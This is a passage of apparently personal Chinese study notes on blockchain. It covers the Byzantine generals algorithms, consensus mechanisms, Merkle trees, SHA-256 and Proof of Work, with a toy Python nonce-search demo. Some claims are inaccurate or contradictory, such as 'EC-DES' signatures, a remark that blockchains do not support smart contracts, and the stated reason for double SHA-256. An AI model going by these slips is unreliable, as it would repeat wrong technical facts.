rel="noopener">如何理解拜占庭将军问题</a></p></blockquote><p><strong>定理1</strong>：对于任意m，如果有超过3m 个将军和最多m 个背叛者，算法OM(m) 满足条件IC1 和条件IC2。</p><p><strong>引理1</strong>：对于任意m 和k ，如果有超过2k+m 个将军和最多k 个背叛者，那么算法OM(m) 满足IC2 （回顾下IC2 指的是，如果将军是忠诚的，所有的副官遵守将军命令）。</p><h4 id="签名消息"><a href="#签名消息" class="headerlink" title="签名消息"></a>签名消息</h4><p>签名消息在除了满足口头消息A1-A3 三点要求外还应该满足下面A4：</p><ul><li><p>A4.</p><ul><li>（a）签名不可被伪造，一旦被篡改即可发现</li><li>（b）任何人都可以验证将军签名的可靠性</li></ul></li></ul><p>choice() 来决定副官的选择：</p><ol><li><p>当集合V 只包含了一个元素v ，那么choice(V)=v ；</p></li><li><p>choice(Φ)=RETREAT。</p></li></ol><h4 id="基于签名消息的算法"><a href="#基于签名消息的算法" class="headerlink" title="基于签名消息的算法"></a>基于签名消息的算法</h4><p>SM(m)算法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">初始化Vi=空集合</span><br><span class="line">（<span class="number">1</span>）将军签署命令并发给每个副官</span><br><span class="line">（<span class="number">2</span>）对于每个副官<span class="selector-tag">i</span> ：</span><br><span class="line">4（A）如果副官<span class="selector-tag">i</span> 从发令者收到v:<span class="number">0</span> 的消息，且还没有收到其他命令序列，那么：</span><br><span class="line">44（i）使Vi 为&#123;v&#125;</span><br><span class="line">44（ii）发送v:<span class="number">0</span>:<span class="selector-tag">i</span> 给其他所有副官</span><br><span class="line">4（B）如果副官<span class="selector-tag">i</span> 收到消息v:<span class="number">0</span>:j1:...:jk 且v 不在集合Vi 中则</span><br><span class="line">44（i）添加v 到Vi</span><br><span class="line">44（ii）如果k&lt;m ，那么发送v:<span class="number">0</span>:j1:...:jk:<span class="selector-tag">i</span> 给每个不在j1,..,jk 中的副官</span><br><span class="line">（<span class="number">3</span>）对于每个副官<span class="selector-tag">i</span> ，当不再收到消息，则遵守命令choice(Vi)</span><br></pre></td></tr></table></figure><h4 id="基于签名消息的算法证明"><a href="#基于签名消息的算法证明" class="headerlink" title="基于签名消息的算法证明"></a>基于签名消息的算法证明</h4><p>定理2：对于任意m，最多只有m 个背叛者情况下，算法SM(m) 解决拜占庭将军问题。</p><h3 id="区块链与分布式系统"><a href="#区块链与分布式系统" class="headerlink" title="区块链与分布式系统"></a>区块链与分布式系统</h3><ul><li>区块链的核心是一个点对点的分布式账本，此类账本具有加密安全性，且仅可追加内容，同时不可更改（很难），只有在对等身份成员之间达成共识或协议时才能更新</li><li>区块链可以定义为一个平台，在此平台上，对等点可以通过交易交换值，而不需要中央信任仲裁者。</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\4.jpg" alt></p><h4 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h4><p>一致性是指<strong>不信任节点之间的协议过程</strong>。</p><blockquote><p>一致性机制所需满足的需求：</p><ul><li>协议：全部可信节点制定同一值</li><li>有效性：所有可信节点的商定值必须与至少一个节点所提议的初始值相同</li><li>容错性：一致性算法应在能出现故障或恶意节点的情况下运行</li><li>完整性：任何节点都不可能做多次决策</li></ul></blockquote><p>一致性机制的<strong>类型</strong>：</p><ul><li>基于拜占庭式的容错：不存在计算密集型操作，依赖于一个简单的、发布签名消息的节点方案</li><li>基于领导的一致性机制：节点实现领导选举机制，由获胜节点提供结果值</li></ul><h4 id="区块链的一般元素"><a href="#区块链的一般元素" class="headerlink" title="区块链的一般元素"></a>区块链的一般元素</h4><ul><li>地址：表示事务中收件人和发件人的唯一标识符，通常表示为公钥或派生自私钥。建议在每个事务中用新生成的地址，防止将交易链接到公共所有者，避免身份识别</li><li>事务：区块链的基本单元，表示地址间的值传输</li><li>区块：由多个交易和其他元素组成</li><li>P2P网络：所有对等点之间的可以彼此通信、发送和接收消息</li><li>脚本或程序语言：交易脚本是节点的预定义集合，用于将令牌从一个地址转移到另一个地址，并执行各种其他功能</li><li>虚拟机：事务脚本的扩展，可运行图灵完备的代码</li><li>状态机：一个区块链可以看作一个状态转换机制</li><li>节点：可以生成并验证交易，同时进行挖掘。根据区块链类型及节点分配的角色，还可以执行其他功能</li><li>智能合约：智能合约运行于区块链之上，在满足某些条件时封装业务。区块链并不支持智能合约</li></ul><h4 id="区块链的特性"><a href="#区块链的特性" class="headerlink" title="区块链的特性"></a>区块链的特性</h4><ul><li><strong>分布式一致性：</strong>缺少中心信任机制授权的情况下，各方都能达成一致</li><li><strong>交易验证：</strong>节点发布交易基于预先确定的规则进行验证，有效的交易才能包含在区块中</li><li><strong>智能合约平台：</strong>区块链定义为一个平台，程序可以运行其上，并代表用户执行业务逻辑</li><li><strong>在对等点间传输值：</strong>允许通过令牌在用户之间传递值，令牌是值的载体</li><li><strong>生成加密货币：</strong>是一个可选的特性，为的是激励矿商</li><li><strong>智能属性：</strong>采用不可撤销的方式将资产与区块链联系起来，使任何人都无权占有、资产完全由个人控制、不可重复使用或双重拥有</li><li><strong>安全提供商：</strong>基于已证实的加密技术，确保数据的完整性和可用性</li><li><strong>不变性：</strong>区块链中的记录是不可变的</li><li><strong>唯一性：</strong>每个交易都是唯一的，且尚未被消费</li><li><strong>智能合约：</strong>区块链提供了一个有智能合约特性的平台，可视为区块链上的自主程序，可以封装业务逻辑和代码，以便下一步所需。智能合约同时实现了灵活性、可编程性、对于特定业务执行的特定操作，区块链用户可对此加以控制</li></ul><h4 id="区块链中的共识"><a href="#区块链中的共识" class="headerlink" title="区块链中的共识"></a>区块链中的共识</h4><ol><li><p><strong>工作量证明机制（PoW）</strong></p><p>依赖于：在提出一个网络接受价值之前已经花费饿了足够的计算资源。用于比特币和其他加密货币。</p></li><li><p><strong>权益证明(PoS)</strong></p><p>理念：节点或用户在系统中具有足够的权益。如用户在系统中投入了足够的资金，因此，恶意行为获得的收益将超出执行系统攻击。应用于以太坊区块链中，生成并签订下一个区块的机会随着币龄而增加。</p></li><li><p><strong>委托权益证明(DPoS)</strong></p><p>对PoS的一种创新，每个节点都可以通过投票将交易的验证委托给其他节点。应用于比特股中。</p></li><li><p><strong>流逝时间证明</strong></p><p>使用可信执行环境（TEE）通过可靠的等待时间再领导选举过程中提供随机性和安全性。</p></li><li><p><strong>基于保证金的共识</strong></p><p>希望加入网络的节点在生成区块链之前存入保证金。</p></li><li><p><strong>重要性证明</strong></p><p>依赖于用户在系统中所拥有的权益份额，并监视用户对令牌的使用和移动，以建立信任和重要性级别。</p></li><li><p><strong>联邦共识和联邦拜占庭共识</strong></p><p>应用于恒星共识协议中，保留一组公开信任的对等点，并只传播由大多数受信节点验证的交易。</p></li><li><p><strong>信誉机制</strong></p><p>基于在网络上建立的声誉选择领导者，由其他成员投票实现。</p></li><li><p><strong>实用拜占庭容错机制(PBFT)</strong></p><p>实现了状态机的复制，并对拜占庭节点提供了容错机制。</p></li></ol><h4 id="基于区块链的去中心化"><a href="#基于区块链的去中心化" class="headerlink" title="基于区块链的去中心化"></a>基于区块链的去中心化</h4><blockquote><p><strong>分布式系统：</strong>数据和计算是分布在多个节点上，计算不可能以并行方式执行，数据仅可在用户视为单一聚合系统的多个节点上进行复制。</p><p><strong>并行系统：</strong>计算是由所有节点同步执行。</p></blockquote><blockquote><p><strong>分布式系统</strong>：存在管理整个系统的中央权威机构，控制权分布在许多节点中。</p><p><strong>去中心化系统：</strong>是节点不依赖与单个主节点的网络类型，且不存在中央权威机构。</p></blockquote><h4 id="去中心化方法"><a href="#去中心化方法" class="headerlink" title="去中心化方法"></a>去中心化方法</h4><p>存在两种方法实现去中心化：<strong>非中介化</strong>和<strong>竞争</strong></p><p>非中介化：不通过中介机构进行相应的活动，或消除中间人或中介机构，如C2C模式；不通过银行转账，而用区块链地址进行直接转账</p><p>竞争：一组服务提供者相互竞争，以便被系统选择进而提供有效服务。在区块链系统中，智能合约可以根据声誉、评分、评论和服务质量，从大量的提供者中选择一个外部的数据提供者。当然这并不是完全的去中心化，但允许智能合约根据标准作出自由选择</p><h4 id="去中心化流程"><a href="#去中心化流程" class="headerlink" title="去中心化流程"></a>去中心化流程</h4><p>不是所有的事务都需要去中心化的</p><blockquote><p><strong>去中心化需求条件评估：</strong></p><ul><li><p>去中心化的含义</p><p>去中心化系统可以是任何系统</p></li><li><p>去中心化所需的级别</p><p>可以是完全中介化或部分中介化</p></li><li><p>采用哪种区块链</p><pre><code>可以选择比特币、以太坊等</code></pre></li><li><p>采用哪种安全性机制</p><p> 原子性机制，确保系统的完整性；声誉机制，支持系统中不同的受信度</p></li></ul></blockquote><h4 id="区块链和完整的生态圈去中心化操作"><a href="#区块链和完整的生态圈去中心化操作" class="headerlink" title="区块链和完整的生态圈去中心化操作"></a>区块链和完整的生态圈去中心化操作</h4><p>去中心化的生态系统概览如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/5.jpg" alt></p><h5 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h5><p>  数据可以直接存储在区块链中，即实现了去中心化操作，但存在一个缺点：区块链不适合存储大量的数据，如图像。</p><p>去中心化存储方案：</p><ul><li><p><strong>分布式哈希表（DHT）：</strong>应用于BitTorrent，用户不会无限期的保存相关文件，如果节点脱离网络，则节点无法被检索到，除非该节点再次加入到网络，以使文件再次可用。</p></li><li><p><strong>Inter Planetary File System（IPFS）</strong>拥有高可用性和链接稳定性，旨在通过替换HTTP协议提供一个去中心化的万维网。使用Kademlia DHT和merkle DAG（有向无环图）分别提供存储和搜索功能。</p></li><li><p>激励机制基于<strong>Filecoin</strong>协议，该协议向使用BitSwap机制存储数据的节点提供激励。 BitSwap机制允许节点保留一个简单的字节账本。</p></li><li><p><strong>Ethereum</strong>包含自身的去中心化和分布式的生态系统，并使用集群存储和whisper协议进行通信。</p></li><li><p><strong>Maidsafe</strong>致力于提供一个去中心化的万维网。</p></li><li><p><strong>BigChainDB</strong>目的是提供一个可伸缩、快速和线性和伸缩的去中心化数据库，而不是传统的文件系统。</p></li></ul><h5 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h5><p>去中心化网络方案：</p><ul><li><p><strong>Internet</strong>旨在建立一个去中心化的系统。该模型基于中央权威（服务提供者）的信任，用户并不负责管理其数据，甚至密码也可存储在受信的第三方系统上。有必要以某种方式向个别用户提供管理权限，确保用户可以访问数据，并且不依赖于第三方。（如IPFS）</p></li><li><p><strong>网状网络：</strong>节点间可以直接对话，而不需要像服务提供商那样采用中心枢纽。例如Firechat，允许iphone用户在没有互联网的情况下以点对点的方式直接进行通信。</p></li></ul><h2 id="密码学与基本技术"><a href="#密码学与基本技术" class="headerlink" title="密码学与基本技术"></a>密码学与基本技术</h2><p>区块链的不可篡改性基于密码学的算法实现</p><ul><li><h4 id="密码学发展简史"><a href="#密码学发展简史" class="headerlink" title="密码学发展简史"></a><strong>密码学发展简史</strong></h4></li><li><h4 id="密码学数学基础"><a href="#密码学数学基础" class="headerlink" title="密码学数学基础"></a><strong>密码学数学基础</strong></h4></li><li><h4 id="对称密码机制"><a href="#对称密码机制" class="headerlink" title="对称密码机制"></a><strong>对称密码机制</strong></h4></li><li><h4 id="非对称密码机制"><a href="#非对称密码机制" class="headerlink" title="非对称密码机制"></a><strong>非对称密码机制</strong></h4></li><li><h4 id="Hash技术"><a href="#Hash技术" class="headerlink" title="Hash技术"></a><strong>Hash技术</strong></h4><p>哈希函数用于创建任意长度的输入字符串、固定长度的文摘，所以常用于数字签名和消息认证码中。</p><blockquote><p> <strong>SHA256</strong>：输入消息大小小于2<sup>64</sup>位。其中，块大小为512位，字大小为32位，输出为256位的文摘。</p><ul><li>预处理算法：</li></ul><p>a) 如果小于512位块尺寸，填充为512位块尺寸。</p><p>b) 将消息解析为消息块，确保消息及其填充内容划分为512位的相等快。</p><p>c) 设置初始哈希值，表示为8个32位的字，是前8个素数的平方根小数的前32位。</p><ul><li>哈希计算步骤：</li></ul><p>a) 每个消息块依次进行处理，需要64轮才能计算出全部哈希结果。其中，每一轮使用不同的常数，以确保没有两轮处于等同状态。</p><p>b) 设置消息轮询。</p><p>c) 初始化8个工作变量。</p><p>d) 计算中间哈希值。</p><p>e) 处理消息并生成输出哈希值。</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\6.jpg" alt></p></li></ul><p>​    在p2p网络下载网络之前，先从可信的源获得文件的Merkle Tree树根。一旦获得了树根，就可以从其他不可信的源获取Merkle tree。通过可信的树根来检查接受到的Merkle Tree。如果Merkle Tree是损坏的或者虚假的，就从其他源获得另一个Merkle Tree，直到获得一个与可信树根匹配的Merkle Tree。</p><ul><li><p>特点：</p><ul><li>MT大多数是二叉树，也可以多叉树，具有树结构的所有特点</li><li>叶子节点的value是数据集合的单元数据或者单元数据HASH</li><li>非叶子节点的value是根据它下面所有的叶子节点值，然后按照Hash算法计算而得出的</li></ul></li><li><p>优点：可以直接下载并立即验证Merkle Tree的一个分支。因为可以将文件切分成小的数据块，这样如果有一块数据损坏，仅仅重新下载这个数据块就行了。</p></li></ul><ul><li><h4 id="基本密码技术的应用"><a href="#基本密码技术的应用" class="headerlink" title="基本密码技术的应用"></a><strong>基本密码技术的应用</strong></h4></li></ul><p>EC-DH交换密钥</p><p>EC-DES签名</p><h2 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h2><blockquote><p>可参考：</p><p><a href="https://www.cnblogs.com/X-knight/p/9157814.html" target="_blank" rel="noopener">[区块链] 共识算法之争(PBFT，Raft，PoW，PoS，DPoS，Ripple)</a></p><p><a href="https://blog.csdn.net/jfkidear/article/details/81275974" target="_blank" rel="noopener">深入浅出PBFT算法原理</a></p></blockquote><h3 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h3><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\7.jpg" alt></p><p>区块链的底层由四部分构成</p><ul><li><strong>分布式数据库</strong>：用来存储以往和将来的交易数据</li><li><strong>密码学</strong>：公钥私钥体系用来确认交易双方的身份</li><li><strong>P2P网络</strong>：用来广播和蔓延各类消息（如节点的加入消息、节点失效消息、得到挖矿数据的消息）</li><li><strong>共识机制</strong>：用来决定节点记账权利</li></ul><p><strong>区块链系统的核心是系统节点竞争记账，这个竞争过程称为共识机制</strong></p><p>共识机制在区块链中扮演着核心地位，共识机制决定了谁有记账的权利，以及记账权利的选择过程和理由</p><ul><li>共识机制：区块链事务达成分布式共识的算法</li></ul><p>不同的虚拟货币采用不同的共识机制，常见的共识机制如POW、POS、DPOS、PBFT等</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\8.jpg" alt></p><h3 id="PoW"><a href="#PoW" class="headerlink" title="PoW"></a>PoW</h3><p>POW：Proof of work，工作量证明机制</p><p>POW工作量证明就是我们所熟悉的<strong>挖矿</strong>，通过与或运算，计算出一个满足规则的随机数，即获得本次记账权，发出本轮所需要记录的数据，全网其他节点验证后一起存储。<strong>这种证明方式的一个显著特征是往往需要很大的工作量才能拿到指定成果，但是这个成果很容易验证</strong></p><p>POW工作量证明的三要素：①工作量证明函数    ②Merkle树    ③难度值</p><h4 id="①工作量证明函数"><a href="#①工作量证明函数" class="headerlink" title="①工作量证明函数"></a>①工作量证明函数</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.输入<span class="keyword">x</span>可以是任意长度的字符串</span><br><span class="line"><span class="number">2</span>.输出结果即H(<span class="keyword">x</span>)的长度是固定的</span><br><span class="line"><span class="number">3</span>.计算H(<span class="keyword">x</span>)的过程是高效的</span><br></pre></td></tr></table></figure><ul><li><h5 id="免碰撞"><a href="#免碰撞" class="headerlink" title="免碰撞"></a>免碰撞</h5></li></ul><p>函数还需要<strong>免碰撞</strong>，即不会出现 x ≠ y ，但是 H(x)=H(y)。但是这个特点在理论上并不成立，对于SHA256算法，会有2^256种输出，进行2^256+1次输出，那么根据鸽巢原理，一定会产生一次碰撞。</p><p>但是从概率的角度看，随机生成K个数，他们不同的概率为 <code>(N-1)/N × (N-2)/N × …… × (N-(k-2) )/N × (N-(k-1))/N</code>  =  e<sup>-k(k-1)/2N</sup>  </p><p>因此，碰撞的概率为 1-e<sup>-k(k-1)/2N</sup>   </p><p>因此，从概率的角度看，sha256进行2^130次输入就会有99%的可能发生一次碰撞</p><p>不过，假设一台计算机以每秒10000次的速度进行哈希运算，要经过10^27年才能完成2^128次hash运算</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\9.jpg" alt></p><p>如图为不同位发生hash碰撞的可能性，最右边是发生hash碰撞的可能性，左边是经过多少个数之后可能达到发生的可能性。</p><ul><li><h5 id="隐匿性"><a href="#隐匿性" class="headerlink" title="隐匿性"></a>隐匿性</h5></li></ul><p>对于一个给定的输出结果H(x)，想要逆推出输入x，在计算上是不可能的。</p><p>不存在比穷举更好的方法，可以使哈希结果H(x)落在特定范围。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/10.jpg" alt></p><p>Block Hash = hash(本页内容，Pre Hash，时间戳)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">s256</span><span class="params">(text)</span>:</span></span><br><span class="line"><span class="meta">... </span>    c = hashlib.sha256(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> text, c.hexdigest()</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s256(<span class="string">'hacking'</span>)</span><br><span class="line">(<span class="string">'hacking'</span>,<span class="string">'42d83a899f20aea7d53614d163ac6e90cf4143919324cee410dd767cf6225bbf'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(t, flag)</span>:</span></span><br><span class="line"><span class="meta">... </span>    pj = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    ans = <span class="literal">None</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="meta">... </span>            s = t + str(pj)</span><br><span class="line"><span class="meta">... </span>            ans = re.match(flag, s256(s)[<span class="number">1</span>])</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">if</span> ans <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="meta">... </span>                    print(pj)</span><br><span class="line"><span class="meta">... </span>                    pj+=<span class="number">1</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>                    print(s256(s))</span><br><span class="line"><span class="meta">... </span>                    <span class="keyword">break</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;0&#125;[a-f0-9]&#123;64&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">(<span class="string">'fuck0'</span>, <span class="string">'2096b072b572e7b3554ab62b542dee4136e4b3a0243be126918d035ec4a4a727'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;1&#125;[a-f0-9]&#123;63&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck10'</span>, <span class="string">'03fc6bfae9f00fa966431f707507d7a18e201d81d564dba42b96b2a7988f3ca6'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;2&#125;[a-f0-9]&#123;62&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck448'</span>,<span class="string">'00ff7469c5332f8f5957f0acb1448d00fa4b2e281065f9202ea549a3a6ff7dba'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;3&#125;[a-f0-9]&#123;61&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck7703'</span>, <span class="string">'0006086f65ce49afbd0479d1094463db1c7385aa1c1cd1ffedc1399404ee4fc9'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;4&#125;[a-f0-9]&#123;60&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck263273'</span>, <span class="string">'000069e2e17d677804f76fb9b79b8f9d7654563a91a77a7d6c75ae30c6963e90'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;5&#125;[a-f0-9]&#123;59&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck271481'</span>, <span class="string">'00000fa9aeacc3e986eaf8b8337d71c67abbd77acfd5cc8b90262f7377fdab7e'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;6&#125;[a-f0-9]&#123;58&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br><span class="line">(<span class="string">'fuck9197297'</span>, <span class="string">'000000c91683616ac0e361c2eafc66de0757e9d46f819e86d30d2cdae1df4398'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">"0&#123;7&#125;[a-f0-9]&#123;57&#125;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cal(<span class="string">"fuck"</span>,flag)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="②Merkle树"><a href="#②Merkle树" class="headerlink" title="②Merkle树"></a>②Merkle树</h4><p>Merkle树一般用于完整性验证处理。Merkle哈希树是一类基于哈希值的二叉树或多叉树，其子节点上的值通常为数据库的哈希值，而非叶子节点上的值该将该节点的所有子节点的组合结果的哈希值。将Merkle Root存入区块头里，Merkle Tree 存入区块体里。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/6.jpg" alt="Merkle Tree"></p><p>节点生成一笔筹币交易，对于4个交易记录L1，L2，L3，L4，分别计算hash(L1)，hash(L2)，hash(L3)，hash(L4)；对于hash0=hash(hash0-0+hash0-1) 和 hash1=hash(hash1-0 + hash1-1)；计算出根节点的hash值top hash，topHash=hash(hash0+hash1)。</p><p>然后将Merkle树root的top hash值存入区块链头中，如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/11.jpg" alt></p><p>区块链中的Merkle树为二叉树，用于存储交易信息。每个交易两两配对，构成Merkle树的子节点，进而生成整个Merkle树。Merkle树使得用户可以通过从区块头得到的Merkle树根和别的用户所提供的中间哈希值列表去验证某个交易是否包含在区块中。提供中间哈希值的用户并不需要是可信的，因为伪造区块头的代价很高，而中间哈希值如果伪造的话会导致验证失败。</p><p>SPV：简化支付验证（Simplified Payment Verification），轻钱包并不保存完整的区块链，而是只保存每一个区块的区块头。区块体保存了完整的交易信息，而交易信息需要的存储量大部分都是交易头的千倍以上。所以，如果只保存交易头，就可以极大的减少本地客户端存储的区块链信息。</p><p>在交易时，发出一个MerkleBlock消息，包含区块头和一条连接目标交易与Merkle根的Merkle路径</p><p>若需验证该交易，即可通过其Merkle路径与交易hash确定一个新的Merkle Root，将其与原root相比即可。</p><blockquote><p>参考：</p><p><a href="https://juejin.im/post/5b7973a7e51d4538e1604b4a" target="_blank" rel="noopener">Merkle Tree 入门</a></p><p><a href="https://www.cnblogs.com/X-knight/p/9142622.html" target="_blank" rel="noopener">密码学——Merkle树</a></p></blockquote><p>假如有交易改变，则整个树枝会发生改变</p><p>定位的时间为O(log(n))，即二叉树的查找时间</p><h4 id="③难度值"><a href="#③难度值" class="headerlink" title="③难度值"></a>③难度值</h4><ul><li>新难度值 = 旧难度值 * （20160分钟  /  最近的2016个区块花费的时长）</li></ul><p>新难度值解析：撇开就难度值，按比特币理想值情况每10分钟出块的速度，过去2016个块的总花费时间接近20160分钟，这样，这个值永远趋于1。</p><p>若过去2016个区块花费时长少于20160分，那么这个系数会小于1，否则，会大于1。</p><p>难度值越大，越难挖。因为20160分大约为14天，而比特币网络大约14天调整一次难度值。</p><p>比特币的难度和出块速度将成反比例适当调整出块速度。</p><p>目标值 = 最大目标值 / 难度值</p><p>最大目标值：一个固定数（恒量，十六进制前8位0后面56位1，即32bit0）0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</p><p> 即前N bit为0</p><p>目标值解析：若过去2016个区块花费时长少于20160分，那么难度值会变小，目标值将会被调小些；否则，目标值会被调大。</p><blockquote><p>查找块的平均时间可以通过如下方式计算：<code>time = difficulty * 2**32 / hashrate</code></p><p>难度值 = time (s) * hashrate (hash / s ) /  (2**32) </p><p>新难度值 / 旧难度值  =  新算力  /  旧算力</p></blockquote><blockquote><p>如果难度为1的话，大约是每秒钟7 Mhashes</p></blockquote><blockquote><p><a href="https://www.cnblogs.com/zhaoweiwei/p/difficulty.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaoweiwei/p/difficulty.html</a></p><p><a href="https://en.bitcoin.it/wiki/Difficulty" target="_blank" rel="noopener">https://en.bitcoin.it/wiki/Difficulty</a></p></blockquote><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">例:</span><br><span class="line">计算目标值,5<span class="built_in">min</span>产生一个区块,sha256算法,算力 400M hash/s.</span><br><span class="line"></span><br><span class="line">一个正确区块被计算,需要进行 (<span class="number">5</span>*<span class="number">60</span>)s * 400M hash/s = <span class="number">120</span>,<span class="number">000</span> M hash</span><br><span class="line">假如计算一个区块头需要1M hash , 则 计算正确头的几率为 <span class="number">1</span> / (<span class="number">2</span>^<span class="number">17</span>) ,(<span class="number">120000</span> ≈ <span class="number">2</span>^<span class="number">17</span>)</span><br><span class="line">所以, (<span class="number">2</span>^(<span class="number">256</span>-<span class="number">17</span>)) / <span class="number">2</span>^<span class="number">256</span> == <span class="number">1</span> / <span class="number">2</span>^<span class="number">17</span></span><br><span class="line">所以, 目标值为: <span class="number">0b0</span>……………………<span class="number">011</span>……</span><br><span class="line">444    |-17bit0-||--(<span class="number">256</span>-<span class="number">17</span>)bit--</span><br></pre></td></tr></table></figure><h4 id="POW工作量证明流程"><a href="#POW工作量证明流程" class="headerlink" title="POW工作量证明流程"></a>POW工作量证明流程</h4><p>流程如下图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/12.jpg" alt></p><ol><li>生成Merkle根哈希</li><li>组装区块头</li><li>计算出工作量证明的输出</li></ol><p><strong>！！！</strong>：区块头里的随机数即是nonce</p><blockquote><p>1.如上</p><p>2.组装区块头：块头将被作为计算出工作量证明输出的一个输入参数，因此第一部计算出来的Merkle根哈希和区块头的其他组成部分组装成区块头</p><p>3.计算出工作量证明的输出：</p><p>​        i) 工作量证明的输出 = SHA256( SHA256(区块头) )</p><p>​        ii) if （工作量证明的输出 &lt;  目标值 ），证明工作量完成</p><p>​        iii) if （工作量证明的输出 &gt;= 目标值），变更随机数(Nonce)，递归 i 的逻辑，继续与目标值比对</p><blockquote><ul><li>对这个值进行两次SHA256运算，为什么要两次，这是因为SHA1在2017年被攻破，采用的方法是birthday collision attack。社区觉得SHA2被攻破也是时间的问题，而抵御birthday collision 